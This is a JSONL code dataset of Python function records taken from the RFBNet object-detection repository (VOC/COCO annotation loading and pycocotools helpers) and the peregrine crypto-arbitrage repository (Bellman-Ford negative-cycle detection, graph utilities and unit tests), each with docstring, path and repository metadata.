{"docstring": "\"\"\" Parse a PASCAL VOC xml file \"\"\"\n", "func_signal": "def parse_rec(filename):\n", "code": "tree = ET.parse(filename)\nobjects = []\nfor obj in tree.findall('object'):\n    obj_struct = {}\n    obj_struct['name'] = obj.find('name').text\n    obj_struct['pose'] = obj.find('pose').text\n    obj_struct['truncated'] = int(obj.find('truncated').text)\n    obj_struct['difficult'] = int(obj.find('difficult').text)\n    bbox = obj.find('bndbox')\n    obj_struct['bbox'] = [int(bbox.find('xmin').text),\n                          int(bbox.find('ymin').text),\n                          int(bbox.find('xmax').text),\n                          int(bbox.find('ymax').text)]\n    objects.append(obj_struct)\n\nreturn objects", "path": "RFBNet/data/voc_eval.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nLoad result file and return a result api object.\n:param   resFile (str)     : file name of result file\n:return: res (obj)         : result api object\n\"\"\"\n", "func_signal": "def loadRes(self, resFile):\n", "code": "res = COCO()\nres.dataset['images'] = [img for img in self.dataset['images']]\n\nprint('Loading and preparing results...')\ntic = time.time()\nif type(resFile) == str or type(resFile) == unicode:\n    anns = json.load(open(resFile))\nelif type(resFile) == np.ndarray:\n    anns = self.loadNumpyAnnotations(resFile)\nelse:\n    anns = resFile\nassert type(anns) == list, 'results in not an array of objects'\nannsImgIds = [ann['image_id'] for ann in anns]\nassert set(annsImgIds) == (set(annsImgIds) & set(self.getImgIds())), \\\n       'Results do not correspond to current coco set'\nif 'caption' in anns[0]:\n    imgIds = set([img['id'] for img in res.dataset['images']]) & set([ann['image_id'] for ann in anns])\n    res.dataset['images'] = [img for img in res.dataset['images'] if img['id'] in imgIds]\n    for id, ann in enumerate(anns):\n        ann['id'] = id+1\nelif 'bbox' in anns[0] and not anns[0]['bbox'] == []:\n    res.dataset['categories'] = copy.deepcopy(self.dataset['categories'])\n    for id, ann in enumerate(anns):\n        bb = ann['bbox']\n        x1, x2, y1, y2 = [bb[0], bb[0]+bb[2], bb[1], bb[1]+bb[3]]\n        if not 'segmentation' in ann:\n            ann['segmentation'] = [[x1, y1, x1, y2, x2, y2, x2, y1]]\n        ann['area'] = bb[2]*bb[3]\n        ann['id'] = id+1\n        ann['iscrowd'] = 0\nelif 'segmentation' in anns[0]:\n    res.dataset['categories'] = copy.deepcopy(self.dataset['categories'])\n    for id, ann in enumerate(anns):\n        # now only support compressed RLE format as segmentation results\n        ann['area'] = maskUtils.area(ann['segmentation'])\n        if not 'bbox' in ann:\n            ann['bbox'] = maskUtils.toBbox(ann['segmentation'])\n        ann['id'] = id+1\n        ann['iscrowd'] = 0\nelif 'keypoints' in anns[0]:\n    res.dataset['categories'] = copy.deepcopy(self.dataset['categories'])\n    for id, ann in enumerate(anns):\n        s = ann['keypoints']\n        x = s[0::3]\n        y = s[1::3]\n        x0,x1,y0,y1 = np.min(x), np.max(x), np.min(y), np.max(y)\n        ann['area'] = (x1-x0)*(y1-y0)\n        ann['id'] = id + 1\n        ann['bbox'] = [x0,y0,x1-x0,y1-y0]\nprint('DONE (t={:0.2f}s)'.format(time.time()- tic))\n\nres.dataset['annotations'] = anns\nres.createIndex()\nreturn res", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "'''\nDownload COCO images from mscoco.org server.\n:param tarDir (str): COCO results directory name\n       imgIds (list): images to be downloaded\n:return:\n'''\n", "func_signal": "def download(self, tarDir = None, imgIds = [] ):\n", "code": "if tarDir is None:\n    print('Please specify target directory')\n    return -1\nif len(imgIds) == 0:\n    imgs = self.imgs.values()\nelse:\n    imgs = self.loadImgs(imgIds)\nN = len(imgs)\nif not os.path.exists(tarDir):\n    os.makedirs(tarDir)\nfor i, img in enumerate(imgs):\n    tic = time.time()\n    fname = os.path.join(tarDir, img['file_name'])\n    if not os.path.exists(fname):\n        urlretrieve(img['coco_url'], fname)\n    print('downloaded {}/{} images (t={:0.1f}s)'.format(i, N, time.time()- tic))", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "'''\nGet img ids that satisfy given filter conditions.\n:param imgIds (int array) : get imgs for given ids\n:param catIds (int array) : get imgs with all given cats\n:return: ids (int array)  : integer array of img ids\n'''\n", "func_signal": "def getImgIds(self, imgIds=[], catIds=[]):\n", "code": "imgIds = imgIds if type(imgIds) == list else [imgIds]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(imgIds) == len(catIds) == 0:\n    ids = self.imgs.keys()\nelse:\n    ids = set(imgIds)\n    for i, catId in enumerate(catIds):\n        if i == 0 and len(ids) == 0:\n            ids = set(self.catToImgs[catId])\n        else:\n            ids &= set(self.catToImgs[catId])\nreturn list(ids)", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nConstruct an image path from the image's \"index\" identifier.\n\"\"\"\n# Example image path for index=119993:\n#   images/train2014/COCO_train2014_000000119993.jpg\n", "func_signal": "def image_path_from_index(self, name, index):\n", "code": "file_name = ('COCO_' + name + '_' +\n             str(index).zfill(12) + '.jpg')\nimage_path = os.path.join(self.root, 'images',\n                      name, file_name)\nassert os.path.exists(image_path), \\\n        'Path does not exist: {}'.format(image_path)\nreturn image_path", "path": "RFBNet/data/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nConvert annotation which can be polygons, uncompressed RLE to RLE.\n:return: binary mask (numpy 2D array)\n\"\"\"\n", "func_signal": "def annToRLE(self, ann):\n", "code": "t = self.imgs[ann['image_id']]\nh, w = t['height'], t['width']\nsegm = ann['segmentation']\nif type(segm) == list:\n    # polygon -- a single object might consist of multiple parts\n    # we merge all parts into one mask rle code\n    rles = maskUtils.frPyObjects(segm, h, w)\n    rle = maskUtils.merge(rles)\nelif type(segm['counts']) == list:\n    # uncompressed RLE\n    rle = maskUtils.frPyObjects(segm, h, w)\nelse:\n    # rle\n    rle = ann['segmentation']\nreturn rle", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nConstructor of Microsoft COCO helper class for reading and visualizing annotations.\n:param annotation_file (str): location of annotation file\n:param image_folder (str): location to the folder that hosts images.\n:return:\n\"\"\"\n# load dataset\n", "func_signal": "def __init__(self, annotation_file=None):\n", "code": "self.dataset,self.anns,self.cats,self.imgs = dict(),dict(),dict(),dict()\nself.imgToAnns, self.catToImgs = defaultdict(list), defaultdict(list)\nif not annotation_file == None:\n    print('loading annotations into memory...')\n    tic = time.time()\n    dataset = json.load(open(annotation_file, 'r'))\n    assert type(dataset)==dict, 'annotation file format {} not supported'.format(type(dataset))\n    print('Done (t={:0.2f}s)'.format(time.time()- tic))\n    self.dataset = dataset\n    self.createIndex()", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "# create index\n", "func_signal": "def createIndex(self):\n", "code": "print('creating index...')\nanns, cats, imgs = {}, {}, {}\nimgToAnns,catToImgs = defaultdict(list),defaultdict(list)\nif 'annotations' in self.dataset:\n    for ann in self.dataset['annotations']:\n        imgToAnns[ann['image_id']].append(ann)\n        anns[ann['id']] = ann\n\nif 'images' in self.dataset:\n    for img in self.dataset['images']:\n        imgs[img['id']] = img\n\nif 'categories' in self.dataset:\n    for cat in self.dataset['categories']:\n        cats[cat['id']] = cat\n\nif 'annotations' in self.dataset and 'categories' in self.dataset:\n    for ann in self.dataset['annotations']:\n        catToImgs[ann['category_id']].append(ann['image_id'])\n\nprint('index created!')\n\n# create class members\nself.anns = anns\nself.imgToAnns = imgToAnns\nself.catToImgs = catToImgs\nself.imgs = imgs\nself.cats = cats", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nPrint information about the annotation file.\n:return:\n\"\"\"\n", "func_signal": "def info(self):\n", "code": "for key, value in self.dataset['info'].items():\n    print('{}: {}'.format(key, value))", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "# [{\"image_id\": 42,\n#   \"category_id\": 18,\n#   \"bbox\": [258.15,41.29,348.26,243.78],\n#   \"score\": 0.236}, ...]\n", "func_signal": "def _write_coco_results_file(self, all_boxes, res_file):\n", "code": "results = []\nfor cls_ind, cls in enumerate(self._classes):\n    if cls == '__background__':\n        continue\n    print('Collecting {} results ({:d}/{:d})'.format(cls, cls_ind,\n                                                  self.num_classes ))\n    coco_cat_id = self._class_to_coco_cat_id[cls]\n    results.extend(self._coco_results_one_category(all_boxes[cls_ind],\n                                                   coco_cat_id))\n    '''\n    if cls_ind ==30:\n        res_f = res_file+ '_1.json'\n        print('Writing results json to {}'.format(res_f))\n        with open(res_f, 'w') as fid:\n            json.dump(results, fid)\n        results = []\n    '''\n#res_f2 = res_file+'_2.json'\nprint('Writing results json to {}'.format(res_file))\nwith open(res_file, 'w') as fid:\n    json.dump(results, fid)", "path": "RFBNet/data/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nConvert result data from a numpy array [Nx7] where each row contains {imageID,x1,y1,w,h,score,class}\n:param  data (numpy.ndarray)\n:return: annotations (python nested list)\n\"\"\"\n", "func_signal": "def loadNumpyAnnotations(self, data):\n", "code": "print('Converting ndarray to lists...')\nassert(type(data) == np.ndarray)\nprint(data.shape)\nassert(data.shape[1] == 7)\nN = data.shape[0]\nann = []\nfor i in range(N):\n    if i % 1000000 == 0:\n        print('{}/{}'.format(i,N))\n    ann += [{\n        'image_id'  : int(data[i, 0]),\n        'bbox'  : [ data[i, 1], data[i, 2], data[i, 3], data[i, 4] ],\n        'score' : data[i, 5],\n        'category_id': int(data[i, 6]),\n        }]\nreturn ann", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nLoad cats with the specified ids.\n:param ids (int array)       : integer ids specifying cats\n:return: cats (object array) : loaded cat objects\n\"\"\"\n", "func_signal": "def loadCats(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.cats[id] for id in ids]\nelif type(ids) == int:\n    return [self.cats[ids]]", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "'''Returns the original image object at index in PIL form\n\nNote: not using self.__getitem__(), as any transformations passed in\ncould mess up this functionality.\n\nArgument:\n    index (int): index of img to show\nReturn:\n    PIL img\n'''\n", "func_signal": "def pull_image(self, index):\n", "code": "img_id = self.ids[index]\nreturn cv2.imread(img_id, cv2.IMREAD_COLOR)", "path": "RFBNet/data/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying anns\n:return: anns (object array) : loaded ann objects\n\"\"\"\n", "func_signal": "def loadAnns(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.anns[id] for id in ids]\nelif type(ids) == int:\n    return [self.anns[ids]]", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nLoads COCO bounding-box instance annotations. Crowd instances are\nhandled by marking their overlaps (with all categories) to -1. This\noverlap value means that crowd \"instances\" are excluded from training.\n\"\"\"\n", "func_signal": "def _annotation_from_index(self, index, _COCO):\n", "code": "im_ann = _COCO.loadImgs(index)[0]\nwidth = im_ann['width']\nheight = im_ann['height']\n\nannIds = _COCO.getAnnIds(imgIds=index, iscrowd=None)\nobjs = _COCO.loadAnns(annIds)\n# Sanitize bboxes -- some are invalid\nvalid_objs = []\nfor obj in objs:\n    x1 = np.max((0, obj['bbox'][0]))\n    y1 = np.max((0, obj['bbox'][1]))\n    x2 = np.min((width - 1, x1 + np.max((0, obj['bbox'][2] - 1))))\n    y2 = np.min((height - 1, y1 + np.max((0, obj['bbox'][3] - 1))))\n    if obj['area'] > 0 and x2 >= x1 and y2 >= y1:\n        obj['clean_bbox'] = [x1, y1, x2, y2]\n        valid_objs.append(obj)\nobjs = valid_objs\nnum_objs = len(objs)\n\nres = np.zeros((num_objs, 5))\n\n# Lookup table to map from COCO category ids to our internal class\n# indices\ncoco_cat_id_to_class_ind = dict([(self._class_to_coco_cat_id[cls],\n                                  self._class_to_ind[cls])\n                                 for cls in self._classes[1:]])\n\nfor ix, obj in enumerate(objs):\n    cls = coco_cat_id_to_class_ind[obj['category_id']]\n    res[ix, 0:4] = obj['clean_bbox']\n    res[ix, 4] = cls\n\nreturn res", "path": "RFBNet/data/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying img\n:return: imgs (object array) : loaded img objects\n\"\"\"\n", "func_signal": "def loadImgs(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.imgs[id] for id in ids]\nelif type(ids) == int:\n    return [self.imgs[ids]]", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nA simple test for get_starting_volume. Volume of the initial currency is limited only once. (on the B/C market)\n\"\"\"\n", "func_signal": "def test_get_starting_volume_a(self):\n", "code": "graph = build_graph_from_edge_list(self.edges_a, 0)\n# the amount of currency A that can be used as limited by the market volumes\nexpected_result = self.edges_a[0][3] * self.volume_scalar_a\nactual_result = get_starting_volume(graph, ['A', 'B', 'C', 'A'])\nself.assertAlmostEqual(actual_result, expected_result)", "path": "peregrine/peregrinearb/tests/test_bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nRetraces an arbitrage opportunity (negative cycle) which a currency can reach and calculates the\nmaximum amount of the first currency in the arbitrage opportunity that can be used to execute the opportunity.\n\nParameters\n----------\nstart\n    A node (currency) from which it is known an arbitrage opportunity is reachable\nunique_paths : bool`\n    unique_paths: If True, no duplicate opportunities are returned\n\nReturns\n-------\n2-tuple\n    [0] : list\n        An arbitrage opportunity reachable from start. Value is None if seen_nodes is True and a\n        duplicate opportunity would be returned.\n    [1] : float\n        The maximum amount of the first currency in the arbitrage opportunity that can be used to execute\n        the opportunity. Value is None if seen_nodes is True and a duplicate opportunity would be returned.\n\"\"\"\n", "func_signal": "def _retrace_negative_cycle(self, start, unique_paths):\n", "code": "arbitrage_loop = [start]\nprior_node = self.predecessor_to[arbitrage_loop[0]]\n# the minimum weight which can be transferred without being limited by edge depths\nminimum = self.graph[prior_node][arbitrage_loop[0]]['depth']\narbitrage_loop.insert(0, prior_node)\nwhile True:\n    if arbitrage_loop[0] in self.seen_nodes and unique_paths:\n        return None, None\n    self.seen_nodes.add(prior_node)\n\n    prior_node = self.predecessor_to[arbitrage_loop[0]]\n    edge_weight = self.graph[prior_node][arbitrage_loop[0]]['weight']\n    edge_depth = self.graph[prior_node][arbitrage_loop[0]]['depth']\n    # if minimum is the limiting volume\n    if edge_weight + edge_depth < minimum:\n        minimum = max(minimum - edge_weight, edge_depth)\n    # if edge_depth is the limiting volume\n    elif edge_weight + edge_depth > minimum:\n        minimum = edge_depth\n\n    if prior_node in arbitrage_loop:\n        arbitrage_loop = arbitrage_loop[:last_index_in_list(arbitrage_loop, prior_node) + 1]\n        arbitrage_loop.insert(0, prior_node)\n        adapter.info('Retraced loop')\n        return arbitrage_loop, math.exp(-minimum)\n\n    arbitrage_loop.insert(0, prior_node)", "path": "peregrine/peregrinearb/bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nAnother test for get_starting_volume. Several markets limit the volume of the first currency in the path.\n\"\"\"\n", "func_signal": "def test_get_starting_volume_b(self):\n", "code": "graph = build_graph_from_edge_list(self.edges_b, 0)\n# the amount of currency A that can be used as limited by the market volumes\nexpected_result = self.edges_b[0][3] * self.volume_scalar_b\nactual_result = get_starting_volume(graph, [x[0] for x in self.edges_b] + [self.edges_b[0][0]])\nself.assertAlmostEqual(actual_result, expected_result)", "path": "peregrine/peregrinearb/tests/test_bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nShould not be used in its current form due to the following:\n1. It is possible that the trades upon which the algorithm detected an arbitrage opportunity have been executed\n(and thus the opportunity may or may not still exist)\n2. The Bellman Ford implementation does not (currently) account for the amounts specified in each order. This is the\nbiggest issue.\n3. It is not maximally profitable as it iterates through each negative cycle (arbitrage opportunity) only once.\n\nThis is a bare-bones proof-of-concept: it shows how the algorithm could be used for financial gain.\n\ntodo: implement an asynchronous version for exchanges which allow margin trading.\n\n:param exchange: A ccxt Exchange object. Should be \"pre-loaded\" with all necessary data (such as the API key).\n:param source: The ticker for any currency in exchange.\n:param amount: Starting amount of source that will be traded.\n\"\"\"\n", "func_signal": "def trade_from_source(exchange, source, amount):\n", "code": "loop = asyncio.get_event_loop()\ngraph = loop.run_until_complete(load_exchange_graph(exchange, name=False, fees=True))\n\npaths = bellman_ford(graph, source, loop_from_source=True, unique_paths=True)\nfor path in paths:\n    for i in range(len(path) - 1):\n        loop.run_until_complete(exchange.create_order(\n            path[i] + '/' + path[i + 1],\n            'limit',\n            'sell',\n            amount,\n            math.exp(-graph[path[i]][path[i + 1]]['weight'])),\n            )\n        amount *= math.exp(-graph[path[i]][path[i + 1]]['weight'])", "path": "peregrine/bot_implementation/one_exchange.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nIf gather_path_data, returns a two-tuple where the first element is the profit ratio for the given path and the\nsecond element is a dict keyed by market symbol and valued by a a dict with 'rate' and 'volume' keys, corresponding\nto the rate and maximum volume for the trade.\nThe volume and rate are always in terms of base currency.\n\"\"\"\n", "func_signal": "def calculate_profit_ratio_for_path(graph, path, depth=False, starting_amount=1, gather_path_data=False):\n", "code": "adapter.info('Calculating profit ratio')\nif gather_path_data:\n    path_data = []\n\nratio = starting_amount\nfor i in range(len(path) - 1):\n    start = path[i]\n    end = path[i + 1]\n    if depth:\n        # volume and rate_with_fee are in terms of start, may be base or quote currency.\n        rate_with_fee = math.exp(-graph[start][end]['weight'])\n        volume = min(ratio, math.exp(-graph[start][end]['depth']))\n        ratio = volume * rate_with_fee\n\n        if gather_path_data:\n            sell = graph[start][end]['trade_type'] == 'SELL'\n            # for buy orders, put volume in terms of base currency.\n            if not sell:\n                volume /= graph[start][end]['no_fee_rate']\n\n            path_data.append({'market_name': graph[start][end]['market_name'],\n                              'rate': graph[start][end]['no_fee_rate'],\n                              'fee': graph[start][end]['fee'],\n                              'volume': volume,\n                              # todo: change order and its usages to type\n                              # if start comes before end in path, this is a sell order.\n                              'order': 'SELL' if sell else 'BUY'})\n    else:\n        ratio *= math.exp(-graph[start][end]['weight'])\n\nadapter.info('Calculated profit ratio')\n\nif gather_path_data:\n    return (ratio / starting_amount), path_data\nreturn ratio / starting_amount", "path": "peregrine/peregrinearb/bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nIt is assumed that either no element e will be added after soft_pop is called or that if an element is added,\nsoft_pop will be called with the knowledge that e will be ignored.\n\nRemoving an element e after soft_pop is called will also have possibly unintended side effects (namely when\nsoft_pop has not yet returned e).\n\"\"\"\n", "func_signal": "def soft_pop(self):\n", "code": "self.soft_pop_counter -= 1\nif -self.soft_pop_counter <= len(self.data):\n    return self.data[self.soft_pop_counter]\nelse:\n    raise IndexError(\"Soft popping completed.\")", "path": "peregrine/peregrinearb/utils/data_structures.py", "commit_date": "2018-10-18 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nCall this to look for opportunities after updating the graph\n\"\"\"\n", "func_signal": "def reset_all_but_graph(self):\n", "code": "self.predecessor_to = {}\nself.distance_to = {}\n\nself.seen_nodes = set()", "path": "peregrine/peregrinearb/bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nEdge bunch must be of the format (u, v, d) where u and v are the tail and head nodes (respectively) and d is a list\nof dicts holding the edge_data for each edge in the bunch\n\ntodo: add this to some sort of utils file/ module in wardbradt/networkx\n\"\"\"\n", "func_signal": "def get_least_edge_in_bunch(edge_bunch, weight='weight'):\n", "code": "if len(edge_bunch[2]) == 0:\n    raise ValueError(\"Edge bunch must contain more than one edge.\")\n\nleast = {weight: float('Inf')}\nfor data in edge_bunch[2]:\n    if data[weight] < least[weight]:\n        least = data\n\nreturn least", "path": "peregrine/peregrinearb/utils/graph_utils.py", "commit_date": "2018-12-01 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nRemoves exchange_name from market_name. If exchange_name is one of 2 exchanges in market_name, removes\nmarket_name.\n\"\"\"\n", "func_signal": "def remove_exchange_from_market(self, exchange_name, market_name):\n", "code": "if market_name not in self.collections.keys():\n    raise ValueError('market {} not in collections. called while trying to remove exchange {}'\n                     .format(market_name, exchange_name))\n\nif exchange_name not in self.collections[market_name]:\n    raise ValueError('exchange {} not in the exchanges for the provided market {}'.format(exchange_name,\n                                                                                          market_name))\n\nif len(self.collections[market_name]) > 2:\n    self.collections[market_name].remove(exchange_name)\n\nelse:\n    del self.collections[market_name]", "path": "peregrine/peregrinearb/utils/data_structures.py", "commit_date": "2018-10-18 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nTests NegativeWeightDepthFinder\n\"\"\"\n", "func_signal": "def test_negative_weight_depth_finder_a(self):\n", "code": "final_edge_weight = 0.25\nedges = [\n    # tail node, head node, no_fee_rate, depth (in terms of profited currency), trade_type\n    ['A', 'B', 2, 3, 'SELL'],\n    ['B', 'C', 3, 4, 'SELL'],\n    ['C', 'D', 1 / 7, 14, 'BUY'],\n    ['D', 'E', 0.2, 3 / 2, 'BUY'],\n    ['E', 'F', 4, 3, 'SELL'],\n    ['F', 'G', 6, 0.8, 'BUY'],\n    ['G', 'H', 0.75, 6, 'BUY'],\n    ['H', 'A', final_edge_weight, 20, 'BUY'],\n]\nfee = 0.01\n\n# ratio for the rates from A -> H\ndef get_edge_ratio():\n    constant_ratio = 1\n    for edge in edges:\n        constant_ratio *= edge[2] * (1 - fee)\n    return constant_ratio\n\nfor i in range(10):\n    edges[-1][2] = final_edge_weight * (i + 1)\n    graph = build_graph_from_edge_list(edges, fee)\n    finder = NegativeWeightDepthFinder(graph)\n    paths = finder.bellman_ford('A')\n\n    edge_ratio = get_edge_ratio()\n    if edge_ratio <= 1:\n        with self.assertRaises(StopIteration):\n            paths.__next__()\n\n    for path, starting_amount in paths:\n        # assert that if a path is found, only one is found.\n        with self.assertRaises(StopIteration):\n            paths.__next__()\n\n        ratio = calculate_profit_ratio_for_path(graph, path, depth=True,\n                                                starting_amount=starting_amount)\n\n        self.assertAlmostEqual(ratio, edge_ratio)", "path": "peregrine/peregrinearb/tests/test_bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nfile_name should hold a JSON which represents a MultiDigraph where there is a maximum of two edges each in opposing\ndirections between each node\n:param file_name:\n\"\"\"\n", "func_signal": "def digraph_from_multi_graph_json(file_name):\n", "code": "with open(file_name) as f:\n    data = json.load(f)\n\nG = nx.DiGraph()\nfor node in data.keys():\n    neighbors = data[node]\n    for neighbor, v in neighbors.items():\n        for key, data_dict in v.items():\n            G.add_edge(node, neighbor, **data_dict)\n\nreturn G", "path": "peregrine/peregrinearb/tests/test_bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nTests the volume returned by NegativeWeightDepthFinder.bellman_ford\n\"\"\"\n", "func_signal": "def test_returned_volume(self):\n", "code": "graph = build_graph_from_edge_list(self.edges_b, 0)\nfinder = NegativeWeightDepthFinder(graph)\nopportunities = finder.bellman_ford('G', True)\nopportunities_found = 0\nfor path, volume in opportunities:\n    opportunities_found += 1\n\n    self.assertGreater(len(path), 2, 'assert that there are at least 2 currencies in the path')\n    self.assertGreater(volume, 0, 'assert that the maximum usable volume is at least 0')\n\n    starting_edge_index = -1\n    for i, edge in enumerate(self.edges_b):\n        if edge[4].lower() != 'sell':\n            raise RuntimeError('This test expects only sell orders. There is an edge which is not a sell '\n                               'order: {}'.format(edge))\n        if edge[0] == path[0]:\n            starting_edge_index = i\n            break\n    # If this fails, something went very wrong or self.edges_b was changed.\n    self.assertNotEqual(starting_edge_index, -1,\n                        'assert that the first currency in the path is a part of an edge in self.edges_b')\n\n    # used because of floating point precision\n    diff_precision = 10 ** -8\n    # how many orders use the maximum amount of possible volume\n    orders_at_volume_capacity = 0\n    for i in range(len(path) - 1):\n        edge = self.edges_b[(starting_edge_index + i) % len(self.edges_b)]\n\n        # difference between usable and used volume\n        maximum_volume_diff = edge[3] - volume\n        try:\n            self.assertGreater(maximum_volume_diff, -diff_precision,\n                               'assert that the volume used is less than the volume allowed by the market')\n        except AssertionError as e:\n            raise e\n        # if the volume used was within 10**-8 of the usable volume\n        if abs(maximum_volume_diff) < diff_precision:\n            orders_at_volume_capacity += 1\n\n        volume *= edge[2]\n    self.assertGreater(orders_at_volume_capacity, 0,\n                       'assert that all of the volume of at least one market is used')\n# assert that only one opportunity was found\nself.assertEqual(opportunities_found, 1)", "path": "peregrine/peregrinearb/tests/test_bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "# self.heap[0][1] is the name of the element\n", "func_signal": "def peek(self):\n", "code": "try:\n    while self.heap[0][1] in self.popped.keys():\n        # Raises IndexError if done popping\n        heapq.heappop(self.heap)\n# for debugging\nexcept Exception as e:\n    raise e\n\nreturn self.heap[0]", "path": "peregrine/peregrinearb/utils/data_structures.py", "commit_date": "2018-10-18 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
{"docstring": "\"\"\"\nFinds arbitrage opportunities in self.graph and yields them\n\nParameters\n----------\nsource\n    A node (currency) in self.graph. Opportunities will be yielded only if they are \"reachable\" from source.\n    Reachable means that a series of trades can be executed to buy one of the currencies in the opportunity.\n    For the most part, it does not matter what the value of source is, because typically any currency can be\n    reached from any other via only a few trades.\nunique_paths : bool\n    unique_paths: If True, each opportunity is not yielded more than once\n:return: a generator of profitable (negatively-weighted) arbitrage paths in self.graph\n\"\"\"\n", "func_signal": "def bellman_ford(self, source='BTC', unique_paths=True):\n", "code": "adapter.info('Running bellman_ford')\nself.initialize(source)\n\nadapter.debug('Relaxing edges')\n# After len(graph) - 1 passes, algorithm is complete.\nfor i in range(len(self.graph) - 1):\n    # for each node in the graph, test if the distance to each of its siblings is shorter by going from\n    # source->base_currency + base_currency->quote_currency\n    for edge in self.graph.edges(data=True):\n        self.relax(edge)\nadapter.debug('Finished relaxing edges')\n\nfor edge in self.graph.edges(data=True):\n    if self.distance_to[edge[0]] + edge[2]['weight'] < self.distance_to[edge[1]]:\n        if unique_paths and edge[1] in self.seen_nodes:\n            continue\n        path = self._retrace_negative_cycle(edge[1], unique_paths)\n        if path is None or path == (None, None):\n            continue\n        yield path\n\nadapter.info('Ran bellman_ford')", "path": "peregrine/peregrinearb/bellmannx.py", "commit_date": "2020-01-05 00:00:00", "repo_name": "wardbradt/peregrine", "stars": 1159, "license": "mit", "language": "python", "size": 4024}
